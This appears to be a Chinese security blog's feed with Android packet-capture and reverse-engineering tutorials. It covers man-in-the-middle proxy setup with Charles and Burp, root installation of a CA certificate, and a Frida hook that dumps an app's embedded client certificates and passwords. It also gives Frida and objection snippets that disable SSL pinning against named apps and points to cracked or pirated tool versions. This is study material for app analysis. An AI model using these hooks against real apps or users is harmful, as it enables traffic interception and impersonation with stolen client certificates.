class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hookallssl</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/bdcbf47/5.1.1.png" class=""><p>如果符号被抹去，就不能用上面那种方法定位了。可以通过更深层次的<code>write()</code>和<code>read()</code> hook回溯调用栈得到<code>SSL_write()</code>和<code>SSL_read()</code>，然后再对函数进行hook，就可以得到发送的明文数据。</p><img src="/posts/bdcbf47/5.1.2.png" class=""><h1 id="6-协议枚举、暴破及算法模拟"><a href="#6-协议枚举、暴破及算法模拟" class="headerlink" title="6. 协议枚举、暴破及算法模拟"></a>6. 协议枚举、暴破及算法模拟</h1><p>用Wireshark抓包发现没有HTTP或HTTPS，只有TCP和UDP等传输层协议，说明这个App是用了自定义Socket协议来通信，这就可以用到上面的知识，分三种情况：</p><ol><li>Java层Socket通信hook点(<code>socketRead0()</code>、<code>socketWrite0()</code>)</li><li>JNI层Socket通信hook点(<code>sendto()</code> 、<code>recvfrom()</code>)</li><li>通过系统调用发送接收数据包(自编译openssl)</li></ol><img src="/posts/bdcbf47/6.1.1.png" class=""><p>课时9我称为封神！建议反复观看！</p><p>基于unicorn框架：unidbg、AndroidNativeEmu</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;要解决的问题：&lt;/p&gt;
&lt;p&gt;如何对自定义协议进行逆向分析？&lt;/p&gt;
&lt;p&gt;发送参数被加密，如何快速完成参数处理流程的定位？&lt;/p&gt;
&lt;p&gt;加密算法复杂，如何主动调用完成对数据包的处理和重放？&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>安卓抓包也是一门学问</title>
    <link href="http://example.com/posts/56766070.html"/>
    <id>http://example.com/posts/56766070.html</id>
    <published>2022-09-06T09:31:36.221Z</published>
    <updated>2022-12-01T08:59:31.590Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-HTTP环境配置"><a href="#1-HTTP环境配置" class="headerlink" title="1. HTTP环境配置"></a>1. HTTP环境配置</h1><p>将主机与手机连上同一WiFi，使它们处于同一局域网内。</p><img src="/posts/56766070/1.1.5.jpg" class=""><span id="more"></span><p>Kali设置为桥接模式或自定义网卡，编辑 -&gt; 虚拟网络编辑器，更改桥接目标与主机一致。</p><img src="/posts/56766070/1.1.1.jpg" class=""><p>此时可以查看各自IP地址，看是否处于同一局域网内。虚拟机与手机要能相互ping通，数据包才能互传。</p><img src="/posts/56766070/1.1.4.png" class=""><h2 id="1-1-Charles"><a href="#1-1-Charles" class="headerlink" title="1.1 Charles"></a>1.1 Charles</h2><p>下载Charles，可以在 <a href="https://www.zzzmode.com/mytools/charles/">https://www.zzzmode.com/mytools/charles/</a> 进行破解，但还是推荐支持正版。</p><p>运行Charles，Proxy -&gt; Proxy Setting 查看监听端口，默认为8888。</p><img src="/posts/56766070/1.1.6.png" class=""><p>将手机连接上的WiFi设置手动代理，代理服务器主机为虚拟机的IP地址，代理服务器端口为监听端口。</p><img src="/posts/56766070/1.1.7.png" class=""><p>在Charles中会弹出窗口，点击允许。</p><img src="/posts/56766070/1.1.8.png" class=""><p>手机随意浏览网页，Charles就捕获到数据包了。当浏览HTTP网页时，可以将页面的相关内容解析出来。</p><img src="/posts/56766070/1.1.9.png" class=""><p>但浏览HTTPS网页时，Charles只充当一个透明代理，收到什么就转发什么，里面的内容解析不出来。 </p><img src="/posts/56766070/1.1.10.png" class=""><h2 id="1-2-Burp-Suite"><a href="#1-2-Burp-Suite" class="headerlink" title="1.2 Burp Suite"></a>1.2 Burp Suite</h2><p>Kali自带，将代理监听器设置为任何IP的8080端口。</p><img src="/posts/56766070/1.2.1.png" class=""><p>将手机连接上的WiFi代理服务器端口修改为8080，即可抓包。</p><img src="/posts/56766070/1.2.2.png" class=""><p>可以去找个Pro版，方便很多。具体安装教程可以参考这篇文章：<a href="https://blog.csdn.net/zw05011/article/details/122459723">https://blog.csdn.net/zw05011/article/details/122459723</a></p><p>同样把IP设置为任意。</p><img src="/posts/56766070/1.2.3.png" class=""><h2 id="1-3-HTTP的缺陷"><a href="#1-3-HTTP的缺陷" class="headerlink" title="1.3 HTTP的缺陷"></a>1.3 HTTP的缺陷</h2><p>HTTP的缺陷：</p><ul><li>通信使用明文(不加密)，内容可能会被窃听</li><li>不验证通信方的身份，因此有可能遭遇伪装</li><li>无法证明报文的完整性，所以有可能已遭篡改</li></ul><h1 id="2-HTTPS环境配置"><a href="#2-HTTPS环境配置" class="headerlink" title="2. HTTPS环境配置"></a>2. HTTPS环境配置</h1><p>HTTP + SSL + 认证 + 完整性保护 = HTTPS</p><p>下图是HTTPS通信完整流程：</p><img src="/posts/56766070/1.1.2.jpg" class=""><h2 id="2-1-HTTPS中间人抓包核心原理"><a href="#2-1-HTTPS中间人抓包核心原理" class="headerlink" title="2.1 HTTPS中间人抓包核心原理"></a>2.1 HTTPS中间人抓包核心原理</h2><p>HTTPS抓包的原理还是挺简单的，简单来说，就是Charles作为“中间人代理”，拿到了 服务器证书公钥 和 HTTPS连接的对称密钥，前提是客户端选择信任并安装Charles的CA证书，否则客户端就会“报警”并中止连接。</p><img src="/posts/56766070/1.1.3.jpg" class="" title="应用层Https抓包的根本原理"><p>有了Charles置于中间之后，本来C/S架构的通信过程会“分裂”为两个独立的通信过程，App本来验证的是服务器的证书，服务器的证书手机的根证书是认可的，直接内置的；但是分裂成两个独立的通信过程之后，App验证的是Charles的证书，它的证书手机根证书并不认可，它并不是由手机内置的权威根证书签发机构签发的，所以手机不认，然后App也不认；所以我们要把Charles的证书导入到手机根证书目录中去，这样手机就会认可，如果App没有进行额外的校验（比如在代码中对该证书进行校验，也就是SSL pinning系列API）的话，App也会直接认可接受。</p><h2 id="2-2-Charles配置SSL"><a href="#2-2-Charles配置SSL" class="headerlink" title="2.2 Charles配置SSL"></a>2.2 Charles配置SSL</h2><p>Proxy -&gt; SSL Proxying Settings，勾选“Enable SSL Proxying”，在“Include”添加任意IP和任意端口。</p><img src="/posts/56766070/2.2.1.png" class=""><p>Charles开启监听，手机如果想要浏览HTTPS网页，会有警告提示。因为浏览器获得的是Charles的公钥而不是HTTPS网页的服务器公钥。</p><img src="/posts/56766070/2.2.3.png" class=""><p>如果用户不顾警告，点击“高级”，选择继续浏览，有些网站可以，但有些网站使用了HSTS(严格传输安全协议)，让浏览器强制使用HTTPS与网站进行通信，以减少会话劫持风险。</p><img src="/posts/56766070/2.2.2.png" class=""><p>如果能继续进入，就可以抓到HTTPS中的一些数据包，比如图片、HTML等，但也有一些红叉叉。</p><img src="/posts/56766070/2.2.8.png" class=""><p>输入账号密码后登录成功，跳转到用户界面，Charles抓到请求响应包，并且可以解析用户界面的内容，比如可以知道学号、姓名等。</p><img src="/posts/56766070/2.2.9.png" class=""><img src="/posts/56766070/2.2.10.png" class=""><p>点击红叉叉的Notes栏提示我们如果想要这些内容显示需要浏览器或应用程序信任Charles根证书。同样，要想成功进入使用了HSTS的网页，也需要添加Charles根证书。</p><p>在浏览器中输入 chls.pro/ssl 下载Charles公钥证书并安装。不同主机下使用Charles抓HTTPS包需要重新安装Charles证书。</p><img src="/posts/56766070/2.2.4.png" class=""><img src="/posts/56766070/2.2.5.png" class=""><p>此时再次访问HTTPS网页就没有警告提示了，链接显示绿色，并且可以将HTML解析出来。</p><img src="/posts/56766070/2.2.6.png" class=""><p>那些红叉叉也没有了。</p><img src="/posts/56766070/2.2.7.png" class=""><h2 id="2-3-Burp-Suite配置SSL"><a href="#2-3-Burp-Suite配置SSL" class="headerlink" title="2.3 Burp Suite配置SSL"></a>2.3 Burp Suite配置SSL</h2><p>同样，如果Burp Suite抓HTTPS的包也是会显示警告提示，也是要安装Burp Suite公钥证书。</p><img src="/posts/56766070/2.3.1.png" class=""><p>导出的是<code>.der</code>格式的证书，将它转化为<code>.pem</code>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform DER -in burpsuite.der -out burpsuite.pem</span><br></pre></td></tr></table></figure><p>再将<code>.pem</code>格式的证书push到手机中，安装证书即可。可以在用户凭据中查看安装的证书。</p><img src="/posts/56766070/2.3.2.png" class=""><p>再次进入HTTPS网页同样可以解析内容。</p><img src="/posts/56766070/2.3.3.png" class=""><h1 id="3-抓取App中的HTTPS"><a href="#3-抓取App中的HTTPS" class="headerlink" title="3. 抓取App中的HTTPS"></a>3. 抓取App中的HTTPS</h1><p>上面讲到，无论HTTP还是HTTPS，都是在浏览器中进行的，那抓App中的内容有什么不同吗？</p><p>以某个视频App为例子，发现它的网页、图片、音视频都是用HTTP传输的，但登录注册肯定是用HTTPS传输的，要不然用户数据就是在网上裸奔。</p><img src="/posts/56766070/3.1.1.png" class=""><p>在尝试发送验证码时，会弹窗“网络不给力”。</p><img src="/posts/56766070/3.1.2.png" class=""><p>怎么回事呢？我们将代理关掉，重新发送验证码，发现会经过一个安全检测，然后可以发送短信。</p><img src="/posts/56766070/3.1.4.png" class=""><img src="/posts/56766070/3.1.3.png" class=""><p>说明这不是网络的问题，而是HTTPS传输时发现公钥不匹配导致的。Charles的抓包结果验证了我们的想法。</p><img src="/posts/56766070/3.1.5.png" class=""><p>这是因为在 Android 7.0（API 24）到 Android 8.1（API 27），默认不再信任用户添加的 CA 证书，所以也就不再信任 Charles 和 Fiddler 抓包工具的证书，所以抓取 HTTPS 包时才会失败。而且在 Android 9.0（API 28）及更高版本上，不仅默认只系统预装的 CA 证书，还默认禁止所有明文通信（不允许 HTTP 请求）。</p><p>解决方案一：IOS和安卓&lt;7.0的版本没有此问题，因此如果条件允许，可以换为苹果手机或安卓版本低于7.0版本的手机去抓取。</p><p>解决方案二：将抓包工具的证书安装到系统凭据中。</p><p>打开Charles，Help -&gt; SSL Proxying -&gt; Save Charles Root Certificate ，以<code>.pem</code>格式保存，在root目录下就会生成一个<code>charles.pem</code>证书。</p><img src="/posts/56766070/3.1.6.png" class=""><p>输入以下命令查看证书的哈希值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -subject_hash_old -in charles.pem</span><br></pre></td></tr></table></figure><img src="/posts/56766070/3.1.7.png" class=""><p>将证书重命名为第一行的<code>bc7c86bb</code>，为了防止文件名冲突可以在末尾追加<code>.0</code>，如果根证书文件夹里面已经有这个文件名了，那就将<code>.0</code>改为<code>.1</code>，以此类推。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv charles.pem bc7c86bb.0</span><br></pre></td></tr></table></figure><p>将证书导入到系统凭据中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">adb push bc7c86bb.0 /sdcard/</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">mount -o rw,remount /system</span><br><span class="line">mv /sdcard/bc7c86bb.0 /system/etc/security/cacerts/</span><br><span class="line">chmod 644 /system/etc/security/cacerts/bc7c86bb.0</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><img src="/posts/56766070/3.1.8.png" class=""><p>Burp Suite的证书同样可以利用这种方法导入到系统凭据中。</p><img src="/posts/56766070/3.1.9.png" class=""><p>现在就可以抓取发送短信验证码的包了。</p><img src="/posts/56766070/3.1.10.png" class=""><p>如果在安全检测中滑动校验时出现“网络不给力”，加载不出拼图也没关系，因为此时我们已经把上面那个包抓到了。</p><img src="/posts/56766070/3.1.11.png" class=""><h1 id="4-Postern-Charles"><a href="#4-Postern-Charles" class="headerlink" title="4. Postern + Charles"></a>4. Postern + Charles</h1><p>现在大部分App都只做了客户端校验服务器的操作，也就是HTTPS中间人抓包核心原理的左半部分。由于通信是双方的，所以有些App为了防止被抓包会进行服务器校验客户端的操作。</p><p>如果App进行了服务器校验客户端，在通信过程中发现传过来客户端的公钥与存储的公钥不匹配，App会直接退出，终止通信。</p><p>目前只有Charles支持通过Postern抓包。单纯使用Charles抓这些App的登录包是抓不住的（应用层抓包），因为App设置了noproxy，根本不走代理，所以此时App还是能成功发送验证码（反正你又抓不到，我为什么不发）。</p><p>具体可看赵四大佬的文章：<a href="http://www.520monkey.com/archives/1263">Android安全防护之旅—只需要这几行代码让Android程序项目变得更加安全</a></p><p>怎样才能抓到这个包呢？可以结合<a href="https://pan.baidu.com/s/1mevjC7TO2t5QeeQGo3x0Eg">Postern</a>，提取码：a9c1。使Charles监听到Postern而不是直接监听App，Postern就是一个VPN，所以App设置不走代理也没用，Postern照样能监听到，然后Postern再转发到Charles上，这样就完成了抓包（传输层抓包）。</p><h2 id="4-1-环境配置"><a href="#4-1-环境配置" class="headerlink" title="4.1 环境配置"></a>4.1 环境配置</h2><p>在Charles中开启SOCKS Proxy：Proxy -&gt; Proxy Settings，勾选“Enable SOCKS Proxy”，默认端口为8889。</p><img src="/posts/56766070/4.1.1.png" class=""><p>手机中的WiFi代理关掉，打开Postern，在配置代理中编辑代理服务器：</p><img src="/posts/56766070/4.1.2.png" class=""><p>在配置规则中编辑规则：</p><img src="/posts/56766070/4.1.3.png" class=""><p>重启一下VPN，此时Charles就会弹窗，点击允许。此时Charles + Postern已经配置好了。</p><h2 id="4-2-VPN抓包"><a href="#4-2-VPN抓包" class="headerlink" title="4.2 VPN抓包"></a>4.2 VPN抓包</h2><p>抓某个视频App的登录包也没问题。</p><img src="/posts/56766070/4.1.4.png" class=""><p>在这样一个环境下，如果抓进行了服务器校验客户端的App的登录包，点击获取验证码后App就会直接退出，此时可以看到Charles抓到了包，但是服务器返回的是400状态码，这里就是服务器校验客户端的精髓所在。</p><img src="/posts/56766070/4.1.5.png" class=""><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>400 Bad Request<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>No required SSL certificate was sent<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-3-客户端证书提取转化和导入抓包"><a href="#4-3-客户端证书提取转化和导入抓包" class="headerlink" title="4.3 客户端证书提取转化和导入抓包"></a>4.3 客户端证书提取转化和导入抓包</h2><p>服务器校验客户端是HTTPS中间人抓包核心原理的右半部分，这时候与服务器进行通信的已经不是App，而是Charles了，所以我们要将App中内置的证书导入到Charles中去。</p><p>那么如何找到这个内置的证书呢？一般进行APK解包后，直接搜索后缀名为<code>.p12</code>的文件即可，一般常用的命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tree -NCfhl | grep -i p12</span><br></pre></td></tr></table></figure><p>直接打印出P12文件的路径，当然也有一些App比较“狡猾”，比如我们通过搜索“p12”没有搜到证书，然后看jadx反编译的源码得出它将证书伪装成<code>border_ks_19</code>文件，我们找到这个文件用file命令查看，果然不是后缀名所显示的PNG格式，将其改成<code>.p12</code>的后缀名，尝试打开时要求输入密码，可见其确实是一个证书。</p><img src="/posts/56766070/4.3.2.jpg" class="" title="伪装成PNG的证书文件"><p>但是这样直接搜索很容易漏掉伪装的证书，并且去查看源码也很麻烦。我们知道自签名证书是需要设置密码的，而开发时设置自签名证书的密码用的是<code>KeyStore.load()</code>函数，具体可看：<a href="https://blog.csdn.net/u013424496/article/details/51161647">App实现自签名的ssl证书</a>。我们可以hook这个函数得到App的所有证书和密码，将它们dump下来，前提是该App开启了存储权限。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_KeyStore_load</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">ByteString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> myArray = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;myArray.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            myArray[i] = <span class="number">0x0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> buffer = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;byte&quot;</span>,myArray);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">StringClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">KeyStore</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.security.KeyStore&quot;</span>);</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.KeyStore$LoadStoreParameter&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load1:&quot;</span>, arg0);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.io.InputStream&#x27;</span>, <span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg0, arg1</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load2:&quot;</span>, arg0, arg1 ? <span class="title class_">StringClass</span>.$new(arg1) : <span class="literal">null</span>);</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span> (arg0)&#123;</span><br><span class="line">                <span class="keyword">var</span> file = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.File&quot;</span>).$new(<span class="string">&quot;/sdcard/Dwonload/certs/&quot;</span> + <span class="title class_">String</span>(arg0) + <span class="string">&quot;.p12&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> out = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.FileOutputStream&quot;</span>).$new(file);</span><br><span class="line">                <span class="keyword">var</span> r;</span><br><span class="line">                <span class="keyword">while</span> ((r = arg0.<span class="title function_">read</span>(buffer)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                    out.<span class="title function_">write</span>(buffer,<span class="number">0</span>,r);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;save success!&quot;</span>);</span><br><span class="line">                out.<span class="title function_">close</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0, arg1);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook_KeyStore_load...&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_KeyStore_load)</span><br></pre></td></tr></table></figure><p>注意这个脚本在Android 8.1.0可行，但Android 10.0.0就不行了，查看Android 10.0.0源码发现已经没有这个<code>KeyStore.load()</code>函数了。</p><p>当然证书还有很多格式，后缀名并不一定都是<code>.p12</code>，实际上在Android中是无法使用P12格式的证书的，Android 系统中使用的证书要求是BKS格式。</p><p>P12格式的证书可以在Windows上直接打开，而BKS不行。如果实在不知道证书的类型或者不会打开其它类型的证书，可以下载 <a href="http://keystore-explorer.org/downloads.html">KeyStore Explorer</a> 证书转换工具，它可以解析证书类型、转换为其它格式的证书。使用该工具的前提是知道证书的密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/kaikramer/keystore-explorer/releases/download/v5.5.1/kse_5.5.1_all.deb</span><br><span class="line">dpkg -i kse_5.5.1_all.deb</span><br></pre></td></tr></table></figure><p>由于Charles只支持导入<code>.p12</code>和<code>.pem</code>格式的证书，所以如果不是这两个格式的证书，可以用KeyStore Explorer工具转换。</p><p><a href="https://help.trustasia.com/how-to-transfer-the-format-of-certificates-by-using-keystore-explorer/">使用KeyStore Explorer工具转换证书格式</a></p><p>得到证书和密码后，下一步就是在Charles中导入证书。Proxy -&gt; SSL Proxying Settings -&gt; Client Certificates，创建一个安全存储，再进行导入证书。Host和Port可以填成任意，意思是你以“趣充”的身份访问所有网站，因为只有“趣充”才有该证书，而平时我们访问网站是匿名的。也可以按最小权限原则，只在某个特定网站才以“趣充”身份访问，比如在4.2中可知是在“share.equchong.com:9443”中校验客户端证书的，所以只在这个网站中以“趣充”身份访问。</p><img src="/posts/56766070/4.3.3.png" class=""><p>Porxy -&gt; Proxy Settings，按照下图填上端口。</p><img src="/posts/56766070/4.3.4.png" class=""><p>此时再次进行抓包，App没有直接退出，短信发送成功，Charles也抓到包了。</p><img src="/posts/56766070/4.3.5.jpg" class=""><h2 id="4-4-SSL-pinning"><a href="#4-4-SSL-pinning" class="headerlink" title="4.4 SSL pinning"></a>4.4 SSL pinning</h2><p>有些App并不会默认信任系统根证书目录中的证书，而是在代码里再加一层校验，这就是证书绑定机制——SSL pinning，如果这段代码的校验过不了，那么App还是会报证书错误。</p><h3 id="4-4-1-案例——回顾-引入"><a href="#4-4-1-案例——回顾-引入" class="headerlink" title="4.4.1 案例——回顾 + 引入"></a>4.4.1 案例——回顾 + 引入</h3><p>开启VPN抓包后，注册时提示“网络异常”，什么原因呢？第一，我们已经将Charles公钥证书存到了系统凭据中，所以不是客户端校验服务器的问题；第二，我们使用的是VPN抓包，Charles抓到了包但显示不出内容，说明有可能存在服务器校验客户端证书，也有可能进行了SSL pinning，或者二者结合。</p><img src="/posts/56766070/4.4.1.png" class=""><p>尝试找一下App里是否内置了证书。开启App的存储权限，hook <code>KeyStore.load()</code>函数将证书和密码dump下来。</p><img src="/posts/56766070/4.4.2.png" class=""><img src="/posts/56766070/4.4.3.png" class=""><p>dump下来了两个，但查看它们的MD5值是一样的，说明这两个是同一个文件。</p><img src="/posts/56766070/4.4.4.png" class=""><p>使用KeyStore Explorer查看证书类型，是P12格式的，直接导入到Charles中。</p><img src="/posts/56766070/4.4.5.png" class=""><img src="/posts/56766070/4.4.6.jpg" class=""><p>此时抓注册包还是“网络异常”，说明App在代码中还进行了SSL pinning。在代码中进行校验，当然可以用hook方法来bypass。</p><h3 id="4-4-2-bypass"><a href="#4-4-2-bypass" class="headerlink" title="4.4.2 bypass"></a>4.4.2 bypass</h3><p>在开发中，<code>javax.net.ssl.X509TrustManager</code>接口，用来校验证书是否被信任。通常会校验 CA 是否为系统内置权威机构、证书有效期等。这个接口有三个方法，分别用来校验客户端证书、校验服务端证书和获取可信证书数组。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 该方法检查客户端的证书，若不信任该证书则抛出异常</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span></span><br><span class="line"><span class="keyword">throws</span> CertificateException &#123;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该方法检查服务器的证书，若不信任该证书同样抛出异常</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span></span><br><span class="line"><span class="keyword">throws</span> CertificateException &#123;</span><br><span class="line">    ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回受信任的X509证书数组</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">X509Certificate</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为App默认不信任系统根证书，所以应该hook <code>checkServerTrusted()</code>函数，将其所有重载都置空。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_ssl</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">ClassName</span> = <span class="string">&quot;com.android.org.conscrypt.Platform&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Platform</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="title class_">ClassName</span>);</span><br><span class="line">        <span class="keyword">var</span> targetMethod = <span class="string">&quot;checkServerTrusted&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> len = <span class="title class_">Platform</span>[targetMethod].<span class="property">overloads</span>.<span class="property">length</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(len);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            <span class="title class_">Platform</span>[targetMethod].<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;class:&quot;</span>, <span class="title class_">ClassName</span>, <span class="string">&quot;target:&quot;</span>, targetMethod, <span class="string">&quot; i:&quot;</span>, i, <span class="variable language_">arguments</span>);</span><br><span class="line">                <span class="comment">//printStack(ClassName + &quot;.&quot; + targetMethod);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook_ssl)</span><br></pre></td></tr></table></figure><p>还有另一种bypass方法，使用objection直接将SSL pinning给disable掉：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.ninemax.ncsearchnew explore -s &quot;android sslpinning 